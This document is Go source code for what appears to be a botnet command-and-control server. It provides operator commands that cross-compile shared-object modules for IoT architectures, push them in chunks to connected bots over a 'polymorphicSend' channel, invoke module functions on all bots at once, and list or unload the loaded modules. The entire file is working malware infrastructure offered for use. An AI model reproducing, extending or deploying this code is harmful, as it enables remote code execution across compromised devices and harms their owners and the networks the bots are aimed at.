package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

const modulesDir = "modules"

type ModuleManifest struct {
	Name    string   `json:"name"`
	Version int      `json:"version"`
	Arches  []string `json:"arches"`
}

func moduleArchPath(name, arch string) string {
	return filepath.Join(modulesDir, name+"."+arch+".so")
}

func moduleManifestPath(name string) string {
	return filepath.Join(modulesDir, name+".json")
}

func loadModuleManifest(name string) (*ModuleManifest, error) {
	data, err := os.ReadFile(moduleManifestPath(name))
	if err != nil {
		return nil, err
	}
	var m ModuleManifest
	if err := json.Unmarshal(data, &m); err != nil {
		return nil, err
	}
	return &m, nil
}

func saveModuleManifest(m *ModuleManifest) error {
	data, _ := json.MarshalIndent(m, "", "  ")
	return os.WriteFile(moduleManifestPath(m.Name), data, 0644)
}

func handleBuildModuleCommand(admin *Admin, tokens []string) string {
	if len(tokens) < 2 {
		return "Usage: BUILDMODULE <name>\n  Compiles modules/src/<name>.c for ALL cross-compilers.\n" +
			"  Generated: modules/<name>.<arch>.so + modules/<name>.json\n"
	}

	name := tokens[1]
	srcPath := filepath.Join(modulesDir, "src", name+".c")
	if _, err := os.Stat(srcPath); os.IsNotExist(err) {
		return fmt.Sprintf("error: source not found at %s\r\n", srcPath)
	}

	// cross-compiler list from build_local.sh
	type ccSpec struct {
		prefix string
		arch   string
	}
	specs := []ccSpec{
		{"", "x86"},
		{"i686-linux-gnu", "x86"},
		{"arm-linux-gnueabi", "arm"},
		{"arm-linux-gnueabihf", "arm7"},
		{"aarch64-linux-gnu", "aarch64"},
		{"powerpc-linux-gnu", "ppc"},
		{"powerpc64le-linux-gnu", "ppc64le"},
		{"riscv64-linux-gnu", "riscv64"},
		{"mips-linux-gnu", "mips"},
		{"mipsel-linux-gnu", "mpsl"},
	}

	var result strings.Builder
	compiledArches := []string{}

	for _, spec := range specs {
		cc := spec.prefix
		if cc != "" {
			cc += "-gcc"
			if _, err := exec.LookPath(cc); err != nil {
				continue
			}
		} else {
			cc = "gcc"
		}
		arch := spec.arch
		outPath := moduleArchPath(name, arch)
		if err := os.MkdirAll(filepath.Dir(outPath), 0755); err != nil {
			continue
		}
		cmd := exec.Command(cc, "-shared", "-fPIC", "-Os", "-Wall",
			"-Imodules/src", srcPath, "-o", outPath)
		out, err := cmd.CombinedOutput()
		if err != nil {
			result.WriteString(fmt.Sprintf("  %s: FAILED (%s)\r\n", arch, strings.TrimSpace(string(out))))
		} else if _, e := os.Stat(outPath); e == nil {
			result.WriteString(fmt.Sprintf("  %s: %s\r\n", arch, outPath))
			compiledArches = append(compiledArches, arch)
		}
	}

	// save manifest
	m := &ModuleManifest{
		Name:    name,
		Version: 1,
		Arches:  compiledArches,
	}
	saveModuleManifest(m)

	return fmt.Sprintf("Module '%s' compiled for %d arches:\r\n%s", name, len(compiledArches), result.String())
}

func handleSendModuleCommand(admin *Admin, tokens []string) string {
	if len(tokens) < 2 {
		return "Usage: SENDMODULE <name> [@arch] [uid]\n" +
			"  Sends compiled .so to matching bots.\n" +
			"  SENDMODULE example      — all bots\n" +
			"  SENDMODULE example @arm — only arm bots\n"
	}

	name := tokens[1]
	archFilter := ""
	uidFilter := 0
	for _, t := range tokens[2:] {
		if strings.HasPrefix(t, "@") {
			archFilter = strings.TrimPrefix(t, "@")
		} else if n, e := strconv.Atoi(t); e == nil {
			uidFilter = n
		}
	}

	sentCount := 0
	clientList.ForEachClient(func(cli *Bot) {
		if cli.conn == nil || cli.ctx == nil || !cli.ctx.Valid {
			return
		}
		if archFilter != "" && cli.source != archFilter {
			return
		}
		if uidFilter != 0 && cli.uid != uidFilter {
			return
		}
		arch := cli.source
		if arch == "" {
			arch = "x86"
		}
		soPath := moduleArchPath(name, arch)
		data, err := os.ReadFile(soPath)
		if err != nil {
			// try generic name
			soPath = filepath.Join(modulesDir, name+".so")
			data, err = os.ReadFile(soPath)
			if err != nil {
				return
			}
		}
		sendModuleToBot(cli.conn, cli.ctx, name, data)
		sentCount++
	})

	return fmt.Sprintf("Sent module '%s' to %d bots\r\n", name, sentCount)
}

func sendModuleToBot(conn net.Conn, ctx *HandshakeCtx, name string, data []byte) {
	sent := uint32(0)
	chunkID := uint32(0)

	for sent < uint32(len(data)) {
		chunkLen := UpdateChunkSize
		if int(sent)+chunkLen > len(data) {
			chunkLen = len(data) - int(sent)
		}

		var payload []byte
		if chunkID == 0 {
			// first chunk: [namelen:1][name:namelen][archlen:1][arch:archlen][data...]
			payload = make([]byte, 1+len(name)+chunkLen)
			payload[0] = byte(len(name))
			copy(payload[1:], name)
			copy(payload[1+len(name):], data[sent:sent+uint32(chunkLen)])
		} else {
			payload = make([]byte, chunkLen)
			copy(payload, data[sent:sent+uint32(chunkLen)])
		}

		polymorphicSend(conn, ctx, PktTypeModule, 0, payload)
		sent += uint32(chunkLen)
		chunkID++
	}

	polymorphicSend(conn, ctx, PktTypeModuleDone, 0, nil)
}

func handleCallModuleCommand(admin *Admin, tokens []string) string {
	if len(tokens) < 3 {
		return "Usage: CALLMODULE <name> <func> [args...]\n  Calls a function in loaded module on all bots.\n"
	}

	name := tokens[1]
	funcName := tokens[2]
	args := ""
	if len(tokens) > 3 {
		args = strings.Join(tokens[3:], " ")
	}

	payload := fmt.Sprintf("%s\x00%s\x00%s", name, funcName, args)
	clientList.QueuePkt(PktTypeModule, []byte(payload), -1, "")
	return fmt.Sprintf("Called '%s' on module '%s' for all bots\r\n", funcName, name)
}

func handleListModulesCommand(admin *Admin, tokens []string) string {
	clientList.QueuePkt(PktTypeModuleList, nil, -1, "")

	details := clientList.BotDetails()
	var b strings.Builder
	b.WriteString("Loaded modules (requested from all bots):\r\n")
	for _, d := range details {
		modStr := "none"
		if len(d.Modules) > 0 {
			modStr = strings.Join(d.Modules, ",")
		}
		verStr := d.Version
		if verStr == "" {
			verStr = "?"
		}
		b.WriteString(fmt.Sprintf("  #%d %-7s %-8s [%s]\r\n",
			d.Uid, d.Source, verStr, modStr))
	}
	return b.String()
}

func handleModulesCommand(admin *Admin, tokens []string) string {
	entries, err := os.ReadDir(modulesDir)
	if err != nil {
		return fmt.Sprintf("error: %v\r\n", err)
	}

	seen := map[string]bool{}
	var b strings.Builder
	b.WriteString("Available modules on CNC:\r\n")
	for _, e := range entries {
		name := e.Name()
		if strings.HasSuffix(name, ".so") {
			base := strings.TrimSuffix(name, ".so")
			if !seen[base] {
				seen[base] = true
				// check for json manifest
				manifestPath := filepath.Join(modulesDir, base+".json")
				if _, err := os.Stat(manifestPath); err == nil {
					if m, e := loadModuleManifest(base); e == nil {
						b.WriteString(fmt.Sprintf("  %s v%d [%s]\r\n", base, m.Version, strings.Join(m.Arches, ",")))
						continue
					}
				}
				b.WriteString(fmt.Sprintf("  %s\r\n", base))
			}
		} else if strings.HasSuffix(name, ".json") {
			// already handled above
		}
	}
	return b.String()
}

func handleUnloadModuleCommand(admin *Admin, tokens []string) string {
	if len(tokens) < 2 {
		return "Usage: UNLOADMODULE <name> [@arch]\n"
	}

	name := tokens[1]
	payload := []byte(name)
	clientList.QueuePkt(PktTypeModule, payload, -1, "")
	return fmt.Sprintf("Unloading module '%s' from all bots\r\n", name)
}
